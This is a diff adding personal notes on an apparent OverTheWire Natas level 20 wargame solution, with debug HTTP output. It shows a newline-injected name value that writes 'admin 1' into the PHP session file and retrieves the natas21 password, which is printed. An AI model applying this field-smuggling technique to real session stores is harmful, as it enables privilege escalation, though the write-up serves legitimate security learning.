@@ -1,0 +1,64 @@
+Lots of code in this one.
+In a nutshell, print_credentials() will be called, and it will spit out the flag
+when: ($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)
+important thing is make admin to be 1
+
+debug() function turns on debug mode
+we don't need myopen(), myclose(), mydestroy() abd mygarbage(): always return true regardless
+
+myread() and mywrite() are what we need to play with
+Didn't really remember exactly how I got this: turned on debug mode, play around with sending
+POST and GET reqs to the server, essentially the objective is to set the key-value pair: admin 1
+Below is the long as output:
+Refer to level20.py	
+
+*******************HTTP response output**********************
+
+DEBUG: MYREAD drbjo22o75nbcqdhhh9jnk5iq1<br>DEBUG: Session file doesn't exist<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+<form action="index.php" method="POST">
+Your name: <input name="name" value=""><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+DEBUG: MYWRITE drbjo22o75nbcqdhhh9jnk5iq1 <br>DEBUG: Saving in /var/lib/php5/sessions//mysess_drbjo22o75nbcqdhhh9jnk5iq1<br>
+*
+*
+DEBUG: MYREAD drbjo22o75nbcqdhhh9jnk5iq1<br>DEBUG: Reading from /var/lib/php5/sessions//mysess_drbjo22o75nbcqdhhh9jnk5iq1<br>DEBUG: Read []<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+<form action="index.php" method="POST">
+Your name: <input name="name" value=""><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+DEBUG: MYWRITE drbjo22o75nbcqdhhh9jnk5iq1 <br>DEBUG: Saving in /var/lib/php5/sessions//mysess_drbjo22o75nbcqdhhh9jnk5iq1<br>
+*
+*
+DEBUG: MYREAD drbjo22o75nbcqdhhh9jnk5iq1<br>DEBUG: Reading from /var/lib/php5/sessions//mysess_drbjo22o75nbcqdhhh9jnk5iq1<br>DEBUG: Read []<br>DEBUG: Name set to jakem
+admin 1<br>You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.
+<form action="index.php" method="POST">
+Your name: <input name="name" value="jakem
+admin 1"><br>
+<input type="submit" value="Change name" />
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+DEBUG: MYWRITE drbjo22o75nbcqdhhh9jnk5iq1 name|s:13:"jakem
+admin 1";<br>DEBUG: Saving in /var/lib/php5/sessions//mysess_drbjo22o75nbcqdhhh9jnk5iq1<br>DEBUG: name => jakem
+admin 1<br>
+*
+*
+DEBUG: MYREAD drbjo22o75nbcqdhhh9jnk5iq1<br>DEBUG: Reading from /var/lib/php5/sessions//mysess_drbjo22o75nbcqdhhh9jnk5iq1<br>DEBUG: Read [name jakem]<br>DEBUG: Read [admin 1]<br>DEBUG: Read []<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ</pre>
+<form action="index.php" method="POST">
+Your name: <input name="name" value="jakem"><br>
+<input type="submit" value="Change name" />
+</form>
+
+flag retrieved: IFekPyrQXftziDEsUr3x21sYuahypdgJ
